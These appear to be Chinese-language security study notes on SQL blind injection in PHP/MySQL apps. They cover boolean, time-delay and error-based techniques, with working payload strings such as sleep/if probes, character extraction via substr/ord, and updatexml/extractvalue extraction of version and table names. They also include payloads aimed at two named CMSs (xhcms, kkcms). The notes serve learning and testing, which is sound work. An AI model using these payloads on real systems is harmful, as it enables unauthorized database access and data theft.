# PHP应用&SQL盲注&布尔回显&延时判断&报错处理&增删改查方式

\#PHP-MYSQL-SQL操作-增删改查

1、功能：数据查询

查询：SELECT * FROM news where id=$id

2、功能：新增用户，添加新闻等

增加：INSERT INTO news (字段名) VALUES (数据)

3、功能：删除用户，删除新闻等

删除：DELETE FROM news WHERE id=$id

4、功能：修改用户，修改文章等

修改：UPDATE news SET id=$id

 

\#PHP-MYSQL-注入函数-布尔&报错&延迟

盲注就是在注入过程中，获取的数据不能回显至前端页面。

我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。

解决：常规的联合查询注入不行的情况

我们可以知道盲注分为以下三类：

1、基于布尔的SQL盲注-逻辑判断

regexp,like,ascii,left,ord,mid

2、基于时间的SQL盲注-延时判断

if,sleep

3、基于报错的SQL盲注-报错回显

floor，updatexml，extractvalue

延迟：

and sleep(1);

and if(1>2,sleep(1),0);

and if(1<2,sleep(1),0);

布尔：

and length(database())=7;

and left(database(),1)='p';

and left(database(),2)='pi';

and substr(database(),1,1)='p';

and substr(database(),2,1)='i';

and ord(left(database(),1))=112;

报错：

and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)

and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

更多：https://www.jianshu.com/p/bc35f8dd4f7c

参考：

like 'ro%'       #判断ro或ro...是否成立 

regexp '^xiaodi[a-z]' #匹配xiaodi及xiaodi...等

if(条件,5,0)      #条件成立 返回5 反之 返回0

sleep(5)        #SQL语句延时执行5秒

mid(a,b,c)       #从位置b开始，截取a字符串的c位

substr(a,b,c)     #从位置b开始，截取字符串a的c长度

left(database(),1)，database() #left(a,b)从左侧截取a的前b位

length(database())=8  #判断数据库database()名的长度

ord=ascii ascii(x)=97 #判断x的ascii码是否等于97

 

\#PHP-MYSQL-注入条件-数据回显&错误处理

PHP开发项目-输出结果&开启报错

基于延时：都不需要

and if(1=1,sleep(5),0)

基于布尔：有数据库输出判断标准

and length(database())=6

基于报错：有数据库报错处理判断标准

and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

测试delete注入：（有无回显，有无报错）

删除（延迟）：1 and if(1=1,sleep(5),0)

删除（布尔）：3 and length(database())=6（无回显 无法判断注入）

删除（报错）：4 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)

 

\#PHP-MYSQL-CMS案例-插入报错&删除延时

1、xhcms-insert报错

' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) and '

 

2、kkcms-delete延时

and if(1=1,sleep(5),0)

or if(1=1,sleep(5),0)

or if(ord(left(database(),1))=107,sleep(2),0)